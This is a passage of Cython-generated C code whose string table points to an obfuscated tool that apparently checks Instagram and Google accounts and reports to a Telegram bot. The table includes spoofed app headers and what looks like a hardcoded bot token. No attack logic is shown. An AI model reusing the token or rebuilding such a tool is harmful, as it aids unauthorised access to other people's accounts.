        utf8_name = PyUnicode_AsUTF8String(name);
        if (!utf8_name) goto bad;
        s = PyBytes_AS_STRING(utf8_name);
        if (__pyx_import_star_set(item, name, s) < 0) goto bad;
        Py_DECREF(utf8_name); utf8_name = 0;
#else
        s = PyString_AsString(name);
        if (!s) goto bad;
        if (__pyx_import_star_set(item, name, s) < 0) goto bad;
#endif
    }
    ret = 0;
bad:
    Py_XDECREF(locals);
    Py_XDECREF(list);
#if PY_MAJOR_VERSION >= 3
    Py_XDECREF(utf8_name);
#endif
    return ret;
}



#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_source(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_source},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "source",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_kp_u_, __pyx_k_, sizeof(__pyx_k_), 0, 1, 0, 0},
  {&__pyx_kp_u_0, __pyx_k_0, sizeof(__pyx_k_0), 0, 1, 0, 0},
  {&__pyx_kp_u_0_0_null_null_web_glif_signup_0, __pyx_k_0_0_null_null_web_glif_signup_0, sizeof(__pyx_k_0_0_null_null_web_glif_signup_0), 0, 1, 0, 0},
  {&__pyx_kp_u_0_2, __pyx_k_0_2, sizeof(__pyx_k_0_2), 0, 1, 0, 0},
  {&__pyx_kp_u_0_91m_0_93m_0_92m_1_97m_1_41m_0, __pyx_k_0_91m_0_93m_0_92m_1_97m_1_41m_0, sizeof(__pyx_k_0_91m_0_93m_0_92m_1_97m_1_41m_0), 0, 1, 0, 0},
  {&__pyx_kp_u_0_91m_0_93m_0_92m_1_97m_1_41m_0_2, __pyx_k_0_91m_0_93m_0_92m_1_97m_1_41m_0_2, sizeof(__pyx_k_0_91m_0_93m_0_92m_1_97m_1_41m_0_2), 0, 1, 0, 0},
  {&__pyx_kp_u_0d067c2f86cac2c17d655631c9cec240, __pyx_k_0d067c2f86cac2c17d655631c9cec240, sizeof(__pyx_k_0d067c2f86cac2c17d655631c9cec240), 0, 1, 0, 0},
  {&__pyx_kp_u_0d067c2f86cac2c17d655631c9cec240_2, __pyx_k_0d067c2f86cac2c17d655631c9cec240_2, sizeof(__pyx_k_0d067c2f86cac2c17d655631c9cec240_2), 0, 1, 0, 0},
  {&__pyx_kp_u_0m, __pyx_k_0m, sizeof(__pyx_k_0m), 0, 1, 0, 0},
  {&__pyx_kp_u_1, __pyx_k_1, sizeof(__pyx_k_1), 0, 1, 0, 0},
  {&__pyx_kp_u_1700251574_982, __pyx_k_1700251574_982, sizeof(__pyx_k_1700251574_982), 0, 1, 0, 0},
  {&__pyx_kp_u_1_000, __pyx_k_1_000, sizeof(__pyx_k_1_000), 0, 1, 0, 0},
  {&__pyx_kp_u_1_30m, __pyx_k_1_30m, sizeof(__pyx_k_1_30m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_31m, __pyx_k_1_31m, sizeof(__pyx_k_1_31m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_32m, __pyx_k_1_32m, sizeof(__pyx_k_1_32m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_32m_2, __pyx_k_1_32m_2, sizeof(__pyx_k_1_32m_2), 0, 1, 0, 0},
  {&__pyx_kp_u_1_32m_THIS_FILE_IS_EXPIRED_Chec, __pyx_k_1_32m_THIS_FILE_IS_EXPIRED_Chec, sizeof(__pyx_k_1_32m_THIS_FILE_IS_EXPIRED_Chec), 0, 1, 0, 0},
  {&__pyx_kp_u_1_33m, __pyx_k_1_33m, sizeof(__pyx_k_1_33m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_34m, __pyx_k_1_34m, sizeof(__pyx_k_1_34m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_35m, __pyx_k_1_35m, sizeof(__pyx_k_1_35m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_36m, __pyx_k_1_36m, sizeof(__pyx_k_1_36m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_37m, __pyx_k_1_37m, sizeof(__pyx_k_1_37m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_91m, __pyx_k_1_91m, sizeof(__pyx_k_1_91m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_95m, __pyx_k_1_95m, sizeof(__pyx_k_1_95m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_96m, __pyx_k_1_96m, sizeof(__pyx_k_1_96m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_97m, __pyx_k_1_97m, sizeof(__pyx_k_1_97m), 0, 1, 0, 0},
  {&__pyx_kp_u_1kbps, __pyx_k_1kbps, sizeof(__pyx_k_1kbps), 0, 1, 0, 0},
  {&__pyx_kp_u_1m_31m, __pyx_k_1m_31m, sizeof(__pyx_k_1m_31m), 0, 1, 0, 0},
  {&__pyx_kp_u_1m_32m, __pyx_k_1m_32m, sizeof(__pyx_k_1m_32m), 0, 1, 0, 0},
  {&__pyx_kp_u_1m_33m, __pyx_k_1m_33m, sizeof(__pyx_k_1m_33m), 0, 1, 0, 0},
  {&__pyx_kp_u_1m_34m, __pyx_k_1m_34m, sizeof(__pyx_k_1m_34m), 0, 1, 0, 0},
  {&__pyx_kp_u_1m_35m, __pyx_k_1m_35m, sizeof(__pyx_k_1m_35m), 0, 1, 0, 0},
  {&__pyx_kp_u_1m_36m, __pyx_k_1m_36m, sizeof(__pyx_k_1m_36m), 0, 1, 0, 0},
  {&__pyx_kp_u_1m_37m, __pyx_k_1m_37m, sizeof(__pyx_k_1m_37m), 0, 1, 0, 0},
  {&__pyx_kp_u_1m_38_5_208m, __pyx_k_1m_38_5_208m, sizeof(__pyx_k_1m_38_5_208m), 0, 1, 0, 0},
  {&__pyx_kp_u_22_2C0_2C0_2C1_2Cnull_2C0_2C516, __pyx_k_22_2C0_2C0_2C1_2Cnull_2C0_2C516, sizeof(__pyx_k_22_2C0_2C0_2C1_2Cnull_2C0_2C516), 0, 1, 0, 0},
  {&__pyx_kp_u_22_2C_22, __pyx_k_22_2C_22, sizeof(__pyx_k_22_2C_22), 0, 1, 0, 0},
  {&__pyx_kp_u_25618261841150840, __pyx_k_25618261841150840, sizeof(__pyx_k_25618261841150840), 0, 1, 0, 0},
  {&__pyx_kp_u_2_31m, __pyx_k_2_31m, sizeof(__pyx_k_2_31m), 0, 1, 0, 0},
  {&__pyx_kp_u_2_32m, __pyx_k_2_32m, sizeof(__pyx_k_2_32m), 0, 1, 0, 0},
  {&__pyx_kp_u_2_34m, __pyx_k_2_34m, sizeof(__pyx_k_2_34m), 0, 1, 0, 0},
  {&__pyx_kp_u_2_35m, __pyx_k_2_35m, sizeof(__pyx_k_2_35m), 0, 1, 0, 0},
  {&__pyx_kp_u_2_36m, __pyx_k_2_36m, sizeof(__pyx_k_2_36m), 0, 1, 0, 0},
  {&__pyx_kp_u_2_39m, __pyx_k_2_39m, sizeof(__pyx_k_2_39m), 0, 1, 0, 0},
  {&__pyx_kp_u_356, __pyx_k_356, sizeof(__pyx_k_356), 0, 1, 0, 0},
  {&__pyx_kp_u_38_5, __pyx_k_38_5, sizeof(__pyx_k_38_5), 0, 1, 0, 0},
  {&__pyx_kp_u_38_5_202m, __pyx_k_38_5_202m, sizeof(__pyx_k_38_5_202m), 0, 1, 0, 0},
  {&__pyx_kp_u_38_5_203m, __pyx_k_38_5_203m, sizeof(__pyx_k_38_5_203m), 0, 1, 0, 0},
  {&__pyx_kp_u_38_5_208m, __pyx_k_38_5_208m, sizeof(__pyx_k_38_5_208m), 0, 1, 0, 0},
  {&__pyx_kp_u_3brTvw, __pyx_k_3brTvw, sizeof(__pyx_k_3brTvw), 0, 1, 0, 0},
  {&__pyx_kp_u_4, __pyx_k_4, sizeof(__pyx_k_4), 0, 1, 0, 0},
  {&__pyx_kp_u_50cc6861_7036_43b4_802e_fb428279, __pyx_k_50cc6861_7036_43b4_802e_fb428279, sizeof(__pyx_k_50cc6861_7036_43b4_802e_fb428279), 0, 1, 0, 0},
  {&__pyx_kp_u_567067343352427, __pyx_k_567067343352427, sizeof(__pyx_k_567067343352427), 0, 1, 0, 0},
  {&__pyx_kp_u_7311958747, __pyx_k_7311958747, sizeof(__pyx_k_7311958747), 0, 1, 0, 0},
  {&__pyx_kp_u_7765081594_AAGRwFlHwEjVQRmtS45vK, __pyx_k_7765081594_AAGRwFlHwEjVQRmtS45vK, sizeof(__pyx_k_7765081594_AAGRwFlHwEjVQRmtS45vK), 0, 1, 0, 0},
  {&__pyx_kp_u_9y3N5kLqzialQA7z96AMiyAKLMBWpqVj, __pyx_k_9y3N5kLqzialQA7z96AMiyAKLMBWpqVj, sizeof(__pyx_k_9y3N5kLqzialQA7z96AMiyAKLMBWpqVj), 0, 1, 0, 0},
  {&__pyx_n_s_A, __pyx_k_A, sizeof(__pyx_k_A), 0, 0, 1, 1},
  {&__pyx_kp_u_A_P_Is_Sss, __pyx_k_A_P_Is_Sss, sizeof(__pyx_k_A_P_Is_Sss), 0, 1, 0, 0},
  {&__pyx_kp_u_Accept_Encoding, __pyx_k_Accept_Encoding, sizeof(__pyx_k_Accept_Encoding), 0, 1, 0, 0},
  {&__pyx_kp_u_Accept_Language, __pyx_k_Accept_Language, sizeof(__pyx_k_Accept_Language), 0, 1, 0, 0},
  {&__pyx_n_s_B, __pyx_k_B, sizeof(__pyx_k_B), 0, 0, 1, 1},
  {&__pyx_n_s_B6, __pyx_k_B6, sizeof(__pyx_k_B6), 0, 0, 1, 1},
  {&__pyx_kp_u_B_P_Ts7, __pyx_k_B_P_Ts7, sizeof(__pyx_k_B_P_Ts7), 0, 1, 0, 0},
  {&__pyx_n_s_BaseException, __pyx_k_BaseException, sizeof(__pyx_k_BaseException), 0, 0, 1, 1},
  {&__pyx_n_s_Bl, __pyx_k_Bl, sizeof(__pyx_k_Bl), 0, 0, 1, 1},
  {&__pyx_n_s_C, __pyx_k_C, sizeof(__pyx_k_C), 0, 0, 1, 1},
  {&__pyx_n_u_Connection, __pyx_k_Connection, sizeof(__pyx_k_Connection), 0, 1, 0, 1},
  {&__pyx_n_s_Console, __pyx_k_Console, sizeof(__pyx_k_Console), 0, 0, 1, 1},
  {&__pyx_kp_u_Content_Length, __pyx_k_Content_Length, sizeof(__pyx_k_Content_Length), 0, 1, 0, 0},
  {&__pyx_kp_u_Content_Type, __pyx_k_Content_Type, sizeof(__pyx_k_Content_Type), 0, 1, 0, 0},
  {&__pyx_n_u_Cookie, __pyx_k_Cookie, sizeof(__pyx_k_Cookie), 0, 1, 0, 1},
  {&__pyx_n_s_DEM, __pyx_k_DEM, sizeof(__pyx_k_DEM), 0, 0, 1, 1},
  {&__pyx_n_s_DEM___init, __pyx_k_DEM___init, sizeof(__pyx_k_DEM___init), 0, 0, 1, 1},
  {&__pyx_n_s_DP6, __pyx_k_DP6, sizeof(__pyx_k_DP6), 0, 0, 1, 1},
  {&__pyx_n_s_DY6, __pyx_k_DY6, sizeof(__pyx_k_DY6), 0, 0, 1, 1},
  {&__pyx_n_s_E, __pyx_k_E, sizeof(__pyx_k_E), 0, 0, 1, 1},
  {&__pyx_kp_u_Error_Could_not_retrieve_bot_inf, __pyx_k_Error_Could_not_retrieve_bot_inf, sizeof(__pyx_k_Error_Could_not_retrieve_bot_inf), 0, 1, 0, 0},
  {&__pyx_kp_u_Error_Could_not_retrieve_user_in, __pyx_k_Error_Could_not_retrieve_user_in, sizeof(__pyx_k_Error_Could_not_retrieve_user_in), 0, 1, 0, 0},
  {&__pyx_n_s_F, __pyx_k_F, sizeof(__pyx_k_F), 0, 0, 1, 1},
  {&__pyx_n_s_G, __pyx_k_G, sizeof(__pyx_k_G), 0, 0, 1, 1},
  {&__pyx_n_s_G6, __pyx_k_G6, sizeof(__pyx_k_G6), 0, 0, 1, 1},
  {&__pyx_n_s_H, __pyx_k_H, sizeof(__pyx_k_H), 0, 0, 1, 1},
  {&__pyx_n_s_HH, __pyx_k_HH, sizeof(__pyx_k_HH), 0, 0, 1, 1},
  {&__pyx_kp_u_HIS_ID, __pyx_k_HIS_ID, sizeof(__pyx_k_HIS_ID), 0, 1, 0, 0},
  {&__pyx_n_u_Host, __pyx_k_Host, sizeof(__pyx_k_Host), 0, 1, 0, 1},
  {&__pyx_kp_u_Host_GAPS, __pyx_k_Host_GAPS, sizeof(__pyx_k_Host_GAPS), 0, 1, 0, 0},
  {&__pyx_n_s_I, __pyx_k_I, sizeof(__pyx_k_I), 0, 0, 1, 1},
  {&__pyx_n_s_ID, __pyx_k_ID, sizeof(__pyx_k_ID), 0, 0, 1, 1},
  {&__pyx_kp_u_IOS_LINK_tg_user_id, __pyx_k_IOS_LINK_tg_user_id, sizeof(__pyx_k_IOS_LINK_tg_user_id), 0, 1, 0, 0},
  {&__pyx_kp_u_I_T_F_Gs_S_O_Ts_S_T_T_A_M_O_A_O, __pyx_k_I_T_F_Gs_S_O_Ts_S_T_T_A_M_O_A_O, sizeof(__pyx_k_I_T_F_Gs_S_O_Ts_S_T_T_A_M_O_A_O), 0, 1, 0, 0},
  {&__pyx_n_s_Id, __pyx_k_Id, sizeof(__pyx_k_Id), 0, 0, 1, 1},
  {&__pyx_n_s_ImportError, __pyx_k_ImportError, sizeof(__pyx_k_ImportError), 0, 0, 1, 1},
  {&__pyx_n_s_InfoAcc, __pyx_k_InfoAcc, sizeof(__pyx_k_InfoAcc), 0, 0, 1, 1},
  {&__pyx_kp_u_Instagram_100_0_0_17_129_Android, __pyx_k_Instagram_100_0_0_17_129_Android, sizeof(__pyx_k_Instagram_100_0_0_17_129_Android), 0, 1, 0, 0},
  {&__pyx_n_s_J, __pyx_k_J, sizeof(__pyx_k_J), 0, 0, 1, 1},
  {&__pyx_n_s_L, __pyx_k_L, sizeof(__pyx_k_L), 0, 0, 1, 1},
  {&__pyx_n_s_L6, __pyx_k_L6, sizeof(__pyx_k_L6), 0, 0, 1, 1},
  {&__pyx_n_u_Liger, __pyx_k_Liger, sizeof(__pyx_k_Liger), 0, 1, 0, 1},
  {&__pyx_n_s_M, __pyx_k_M, sizeof(__pyx_k_M), 0, 0, 1, 1},
  {&__pyx_kp_u_Mozilla_5_0_Linux_Android_10_K_A, __pyx_k_Mozilla_5_0_Linux_Android_10_K_A, sizeof(__pyx_k_Mozilla_5_0_Linux_Android_10_K_A), 0, 1, 0, 0},
  {&__pyx_n_s_N, __pyx_k_N, sizeof(__pyx_k_N), 0, 0, 1, 1},
  {&__pyx_kp_u_No_first_name_available, __pyx_k_No_first_name_available, sizeof(__pyx_k_No_first_name_available), 0, 1, 0, 0},
  {&__pyx_kp_u_None, __pyx_k_None, sizeof(__pyx_k_None), 0, 1, 0, 0},
  {&__pyx_kp_u_Not_A_Brand_v_99_Google_Chrome, __pyx_k_Not_A_Brand_v_99_Google_Chrome, sizeof(__pyx_k_Not_A_Brand_v_99_Google_Chrome), 0, 1, 0, 0},
  {&__pyx_n_s_O, __pyx_k_O, sizeof(__pyx_k_O), 0, 0, 1, 1},
  {&__pyx_n_s_O6, __pyx_k_O6, sizeof(__pyx_k_O6), 0, 0, 1, 1},
  {&__pyx_n_s_P, __pyx_k_P, sizeof(__pyx_k_P), 0, 0, 1, 1},
  {&__pyx_n_s_P6, __pyx_k_P6, sizeof(__pyx_k_P6), 0, 0, 1, 1},
  {&__pyx_n_u_PROFILE, __pyx_k_PROFILE, sizeof(__pyx_k_PROFILE), 0, 1, 0, 1},
  {&__pyx_kp_u_P_A_Is, __pyx_k_P_A_Is, sizeof(__pyx_k_P_A_Is), 0, 1, 0, 0},
  {&__pyx_kp_u_P_Is_N_Is_S_Ps_W, __pyx_k_P_Is_N_Is_S_Ps_W, sizeof(__pyx_k_P_Is_N_Is_S_Ps_W), 0, 1, 0, 0},
  {&__pyx_kp_u_Ps_W_W_C_Y_PP, __pyx_k_Ps_W_W_C_Y_PP, sizeof(__pyx_k_Ps_W_W_C_Y_PP), 0, 1, 0, 0},
  {&__pyx_n_s_R, __pyx_k_R, sizeof(__pyx_k_R), 0, 0, 1, 1},
  {&__pyx_n_s_S, __pyx_k_S, sizeof(__pyx_k_S), 0, 0, 1, 1},
  {&__pyx_n_s_Session, __pyx_k_Session, sizeof(__pyx_k_Session), 0, 0, 1, 1},
  {&__pyx_n_s_Snuff, __pyx_k_Snuff, sizeof(__pyx_k_Snuff), 0, 0, 1, 1},
  {&__pyx_n_s_Snuff73, __pyx_k_Snuff73, sizeof(__pyx_k_Snuff73), 0, 0, 1, 1},
  {&__pyx_n_u_TL, __pyx_k_TL, sizeof(__pyx_k_TL), 0, 1, 0, 1},
  {&__pyx_kp_u_TOKEN, __pyx_k_TOKEN, sizeof(__pyx_k_TOKEN), 0, 1, 0, 0},
  {&__pyx_n_s_Table, __pyx_k_Table, sizeof(__pyx_k_Table), 0, 0, 1, 1},
  {&__pyx_n_s_Thread, __pyx_k_Thread, sizeof(__pyx_k_Thread), 0, 0, 1, 1},
  {&__pyx_kp_u_User_Agent, __pyx_k_User_Agent, sizeof(__pyx_k_User_Agent), 0, 1, 0, 0},
  {&__pyx_kp_u_User_does_not_have_a_username_Do, __pyx_k_User_does_not_have_a_username_Do, sizeof(__pyx_k_User_does_not_have_a_username_Do), 0, 1, 0, 0},
  {&__pyx_n_s_W6, __pyx_k_W6, sizeof(__pyx_k_W6), 0, 0, 1, 1},
  {&__pyx_n_u_WIFI, __pyx_k_WIFI, sizeof(__pyx_k_WIFI), 0, 1, 0, 1},
  {&__pyx_kp_u_Windows, __pyx_k_Windows, sizeof(__pyx_k_Windows), 0, 1, 0, 0},
  {&__pyx_n_s_Wsnuff, __pyx_k_Wsnuff, sizeof(__pyx_k_Wsnuff), 0, 0, 1, 1},
  {&__pyx_n_s_X, __pyx_k_X, sizeof(__pyx_k_X), 0, 0, 1, 1},
  {&__pyx_kp_u_X_Bloks_Version_Id, __pyx_k_X_Bloks_Version_Id, sizeof(__pyx_k_X_Bloks_Version_Id), 0, 1, 0, 0},
  {&__pyx_kp_u_X_FB_HTTP_Engine, __pyx_k_X_FB_HTTP_Engine, sizeof(__pyx_k_X_FB_HTTP_Engine), 0, 1, 0, 0},
  {&__pyx_kp_u_X_FB_LSD, __pyx_k_X_FB_LSD, sizeof(__pyx_k_X_FB_LSD), 0, 1, 0, 0},
  {&__pyx_kp_u_X_IG_App_ID, __pyx_k_X_IG_App_ID, sizeof(__pyx_k_X_IG_App_ID), 0, 1, 0, 0},
  {&__pyx_kp_u_X_IG_Bandwidth_Speed_KBPS, __pyx_k_X_IG_Bandwidth_Speed_KBPS, sizeof(__pyx_k_X_IG_Bandwidth_Speed_KBPS), 0, 1, 0, 0},
  {&__pyx_kp_u_X_IG_Bandwidth_TotalBytes_B, __pyx_k_X_IG_Bandwidth_TotalBytes_B, sizeof(__pyx_k_X_IG_Bandwidth_TotalBytes_B), 0, 1, 0, 0},
  {&__pyx_kp_u_X_IG_Bandwidth_TotalTime_MS, __pyx_k_X_IG_Bandwidth_TotalTime_MS, sizeof(__pyx_k_X_IG_Bandwidth_TotalTime_MS), 0, 1, 0, 0},
  {&__pyx_kp_u_X_IG_Capabilities, __pyx_k_X_IG_Capabilities, sizeof(__pyx_k_X_IG_Capabilities), 0, 1, 0, 0},
  {&__pyx_kp_u_X_IG_Connection_Speed, __pyx_k_X_IG_Connection_Speed, sizeof(__pyx_k_X_IG_Connection_Speed), 0, 1, 0, 0},
  {&__pyx_kp_u_X_IG_Connection_Type, __pyx_k_X_IG_Connection_Type, sizeof(__pyx_k_X_IG_Connection_Type), 0, 1, 0, 0},
  {&__pyx_kp_u_X_Pigeon_Rawclienttime, __pyx_k_X_Pigeon_Rawclienttime, sizeof(__pyx_k_X_Pigeon_Rawclienttime), 0, 1, 0, 0},
  {&__pyx_kp_u_X_Pigeon_Session_Id, __pyx_k_X_Pigeon_Session_Id, sizeof(__pyx_k_X_Pigeon_Session_Id), 0, 1, 0, 0},
  {&__pyx_n_s_Y, __pyx_k_Y, sizeof(__pyx_k_Y), 0, 0, 1, 1},
  {&__pyx_n_s_Y6, __pyx_k_Y6, sizeof(__pyx_k_Y6), 0, 0, 1, 1},
  {&__pyx_n_s_Z, __pyx_k_Z, sizeof(__pyx_k_Z), 0, 0, 1, 1},
  {&__pyx_n_s_Z1, __pyx_k_Z1, sizeof(__pyx_k_Z1), 0, 0, 1, 1},
  {&__pyx_kp_u__106, __pyx_k__106, sizeof(__pyx_k__106), 0, 1, 0, 0},
  {&__pyx_kp_u__11, __pyx_k__11, sizeof(__pyx_k__11), 0, 1, 0, 0},
  {&__pyx_kp_u__14, __pyx_k__14, sizeof(__pyx_k__14), 0, 1, 0, 0},
  {&__pyx_kp_u__17, __pyx_k__17, sizeof(__pyx_k__17), 0, 1, 0, 0},
  {&__pyx_kp_u__2, __pyx_k__2, sizeof(__pyx_k__2), 0, 1, 0, 0},
  {&__pyx_kp_u__21, __pyx_k__21, sizeof(__pyx_k__21), 0, 1, 0, 0},
  {&__pyx_kp_u__22, __pyx_k__22, sizeof(__pyx_k__22), 0, 1, 0, 0},
  {&__pyx_kp_u__24, __pyx_k__24, sizeof(__pyx_k__24), 0, 1, 0, 0},
  {&__pyx_kp_u__25, __pyx_k__25, sizeof(__pyx_k__25), 0, 1, 0, 0},
  {&__pyx_kp_u__27, __pyx_k__27, sizeof(__pyx_k__27), 0, 1, 0, 0},
  {&__pyx_kp_u__29, __pyx_k__29, sizeof(__pyx_k__29), 0, 1, 0, 0},
  {&__pyx_kp_u__3, __pyx_k__3, sizeof(__pyx_k__3), 0, 1, 0, 0},
  {&__pyx_kp_u__31, __pyx_k__31, sizeof(__pyx_k__31), 0, 1, 0, 0},
  {&__pyx_kp_u__37, __pyx_k__37, sizeof(__pyx_k__37), 0, 1, 0, 0},
  {&__pyx_kp_u__4, __pyx_k__4, sizeof(__pyx_k__4), 0, 1, 0, 0},
  {&__pyx_kp_u__5, __pyx_k__5, sizeof(__pyx_k__5), 0, 1, 0, 0},
  {&__pyx_kp_u__52, __pyx_k__52, sizeof(__pyx_k__52), 0, 1, 0, 0},
  {&__pyx_kp_u__56, __pyx_k__56, sizeof(__pyx_k__56), 0, 1, 0, 0},
  {&__pyx_kp_u__57, __pyx_k__57, sizeof(__pyx_k__57), 0, 1, 0, 0},
  {&__pyx_kp_u__58, __pyx_k__58, sizeof(__pyx_k__58), 0, 1, 0, 0},
  {&__pyx_kp_u__59, __pyx_k__59, sizeof(__pyx_k__59), 0, 1, 0, 0},
  {&__pyx_kp_u__6, __pyx_k__6, sizeof(__pyx_k__6), 0, 1, 0, 0},
  {&__pyx_kp_u__60, __pyx_k__60, sizeof(__pyx_k__60), 0, 1, 0, 0},
  {&__pyx_kp_u__61, __pyx_k__61, sizeof(__pyx_k__61), 0, 1, 0, 0},
  {&__pyx_kp_u__62, __pyx_k__62, sizeof(__pyx_k__62), 0, 1, 0, 0},
  {&__pyx_kp_u__63, __pyx_k__63, sizeof(__pyx_k__63), 0, 1, 0, 0},
  {&__pyx_n_s__64, __pyx_k__64, sizeof(__pyx_k__64), 0, 0, 1, 1},
  {&__pyx_kp_u__69, __pyx_k__69, sizeof(__pyx_k__69), 0, 1, 0, 0},
  {&__pyx_kp_u__7, __pyx_k__7, sizeof(__pyx_k__7), 0, 1, 0, 0},
  {&__pyx_kp_u__70, __pyx_k__70, sizeof(__pyx_k__70), 0, 1, 0, 0},
  {&__pyx_kp_u__71, __pyx_k__71, sizeof(__pyx_k__71), 0, 1, 0, 0},
  {&__pyx_kp_u__72, __pyx_k__72, sizeof(__pyx_k__72), 0, 1, 0, 0},
  {&__pyx_kp_u__73, __pyx_k__73, sizeof(__pyx_k__73), 0, 1, 0, 0},
  {&__pyx_kp_u__74, __pyx_k__74, sizeof(__pyx_k__74), 0, 1, 0, 0},
  {&__pyx_kp_u__75, __pyx_k__75, sizeof(__pyx_k__75), 0, 1, 0, 0},
  {&__pyx_kp_u__76, __pyx_k__76, sizeof(__pyx_k__76), 0, 1, 0, 0},
  {&__pyx_kp_u__77, __pyx_k__77, sizeof(__pyx_k__77), 0, 1, 0, 0},
  {&__pyx_kp_u__78, __pyx_k__78, sizeof(__pyx_k__78), 0, 1, 0, 0},
  {&__pyx_kp_u__79, __pyx_k__79, sizeof(__pyx_k__79), 0, 1, 0, 0},
  {&__pyx_kp_u__8, __pyx_k__8, sizeof(__pyx_k__8), 0, 1, 0, 0},
  {&__pyx_kp_u__80, __pyx_k__80, sizeof(__pyx_k__80), 0, 1, 0, 0},
  {&__pyx_kp_u__81, __pyx_k__81, sizeof(__pyx_k__81), 0, 1, 0, 0},
  {&__pyx_kp_u__82, __pyx_k__82, sizeof(__pyx_k__82), 0, 1, 0, 0},
  {&__pyx_kp_u__83, __pyx_k__83, sizeof(__pyx_k__83), 0, 1, 0, 0},
  {&__pyx_kp_u__84, __pyx_k__84, sizeof(__pyx_k__84), 0, 1, 0, 0},
  {&__pyx_kp_u__87, __pyx_k__87, sizeof(__pyx_k__87), 0, 1, 0, 0},
  {&__pyx_kp_u__9, __pyx_k__9, sizeof(__pyx_k__9), 0, 1, 0, 0},
  {&__pyx_kp_u__93, __pyx_k__93, sizeof(__pyx_k__93), 0, 1, 0, 0},
  {&__pyx_n_s__94, __pyx_k__94, sizeof(__pyx_k__94), 0, 0, 1, 1},
  {&__pyx_n_s_a, __pyx_k_a, sizeof(__pyx_k_a), 0, 0, 1, 1},
  {&__pyx_n_u_a, __pyx_k_a, sizeof(__pyx_k_a), 0, 1, 0, 1},
  {&__pyx_kp_u_a_Python_Tools7_MrSnuff, __pyx_k_a_Python_Tools7_MrSnuff, sizeof(__pyx_k_a_Python_Tools7_MrSnuff), 0, 1, 0, 0},
  {&__pyx_n_s_aa, __pyx_k_aa, sizeof(__pyx_k_aa), 0, 0, 1, 1},
  {&__pyx_n_s_aca, __pyx_k_aca, sizeof(__pyx_k_aca), 0, 0, 1, 1},
  {&__pyx_n_u_accept, __pyx_k_accept, sizeof(__pyx_k_accept), 0, 1, 0, 1},
  {&__pyx_kp_u_accept_language, __pyx_k_accept_language, sizeof(__pyx_k_accept_language), 0, 1, 0, 0},
  {&__pyx_kp_u_accounts_google_com, __pyx_k_accounts_google_com, sizeof(__pyx_k_accounts_google_com), 0, 1, 0, 0},
  {&__pyx_n_u_adid, __pyx_k_adid, sizeof(__pyx_k_adid), 0, 1, 0, 1},
  {&__pyx_n_s_align, __pyx_k_align, sizeof(__pyx_k_align), 0, 0, 1, 1},
  {&__pyx_n_s_amsc, __pyx_k_amsc, sizeof(__pyx_k_amsc), 0, 0, 1, 1},
  {&__pyx_n_u_amsc, __pyx_k_amsc, sizeof(__pyx_k_amsc), 0, 1, 0, 1},
  {&__pyx_n_s_an, __pyx_k_an, sizeof(__pyx_k_an), 0, 0, 1, 1},
  {&__pyx_n_s_an2, __pyx_k_an2, sizeof(__pyx_k_an2), 0, 0, 1, 1},
  {&__pyx_kp_u_android, __pyx_k_android, sizeof(__pyx_k_android), 0, 1, 0, 0},
  {&__pyx_kp_u_apiCanary, __pyx_k_apiCanary, sizeof(__pyx_k_apiCanary), 0, 1, 0, 0},
  {&__pyx_n_u_apiCanary_2, __pyx_k_apiCanary_2, sizeof(__pyx_k_apiCanary_2), 0, 1, 0, 1},
  {&__pyx_kp_u_application_json, __pyx_k_application_json, sizeof(__pyx_k_application_json), 0, 1, 0, 0},
  {&__pyx_kp_u_application_json_text_plain, __pyx_k_application_json_text_plain, sizeof(__pyx_k_application_json_text_plain), 0, 1, 0, 0},
  {&__pyx_kp_u_application_x_www_form_urlencode, __pyx_k_application_x_www_form_urlencode, sizeof(__pyx_k_application_x_www_form_urlencode), 0, 1, 0, 0},
  {&__pyx_kp_u_application_x_www_form_urlencode_2, __pyx_k_application_x_www_form_urlencode_2, sizeof(__pyx_k_application_x_www_form_urlencode_2), 0, 1, 0, 0},
  {&__pyx_kp_u_ar_IQ_ar_q_0_9_en_IQ_q_0_8_en_q, __pyx_k_ar_IQ_ar_q_0_9_en_IQ_q_0_8_en_q, sizeof(__pyx_k_ar_IQ_ar_q_0_9_en_IQ_q_0_8_en_q), 0, 1, 0, 0},
  {&__pyx_n_s_args, __pyx_k_args, sizeof(__pyx_k_args), 0, 0, 1, 1},
  {&__pyx_n_s_ascii_letters, __pyx_k_ascii_letters, sizeof(__pyx_k_ascii_letters), 0, 0, 1, 1},
  {&__pyx_n_u_authority, __pyx_k_authority, sizeof(__pyx_k_authority), 0, 1, 0, 1},
  {&__pyx_n_u_azertyuiopmlkjhgfdsqwxcvbn, __pyx_k_azertyuiopmlkjhgfdsqwxcvbn, sizeof(__pyx_k_azertyuiopmlkjhgfdsqwxcvbn), 0, 1, 0, 1},
